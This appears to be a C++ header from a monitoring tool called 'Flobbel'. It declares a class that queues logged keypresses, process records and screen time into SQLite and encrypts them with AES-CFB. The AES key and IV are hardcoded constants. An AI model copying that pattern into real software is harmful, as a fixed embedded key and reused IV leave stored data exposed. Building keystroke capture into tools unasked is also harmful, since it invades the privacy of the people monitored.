//
// Created by Chrystalkey on 01.07.2019.
//

#ifndef FLOBBEL_FLOBBELSAFE_H
#define FLOBBEL_FLOBBELSAFE_H

#include <fstream>
#include <queue>
#include <string>

#include "osrng.h"
#include "aes.h"
#include "modes.h"
#include "filters.h"

#include "sqlite3.h"

#include "global_functions.h"

static const CryptoPP::byte _key[32] = {
        0xEF,0x46,0x94,0x5A,0x73,0xCE,0x2A,0xCF,
        0x97,0xD4,0x39,0x67,0x81,0x56,0x8C,0x06,
        0x0F,0x8A,0x6E,0x33,0xBC,0xFE,0xAB,0xBE,
        0x9A,0x22,0xA1,0xF7,0xA5,0x29,0x35,0xFD
};
static const CryptoPP::byte _iv[16] = {
        0x9E,0x9B,0x6A,0x8B,0xCF,0xB8,0x48,0x5F,
        0x6D,0xB8,0xD0,0x42,0x89,0x12,0xD3,0x2F
};

class FlobbelSafe {
public:
    explicit FlobbelSafe(std::wstring &_safedir);
    ~FlobbelSafe();
public:
    void add_key(KeypressInfo &);
    void add_prc(ProcessInfo &);
    void add_screentime(Screentime &);
private:
    std::queue<std::wstring> keyQueue;
    std::queue<std::wstring> prcQueue;
    std::wstring safedir;
private:
    void encrypt_n_copy(const std::wstring &file);
    void decrypt_n_copy(const std::wstring &file);
    CryptoPP::CFB_Mode<CryptoPP::AES>::Encryption cfbEncrypt;
    CryptoPP::CFB_Mode<CryptoPP::AES>::Decryption cfbDecrypt;
    CryptoPP::SecByteBlock key;
    CryptoPP::SecByteBlock iv;
    std::vector<CryptoPP::byte> buffer;
private:
    sqlite3 *dbcon;
    std::wstring keyTable, proTable;
};

#endif //FLOBBEL_FLOBBELSAFE_H
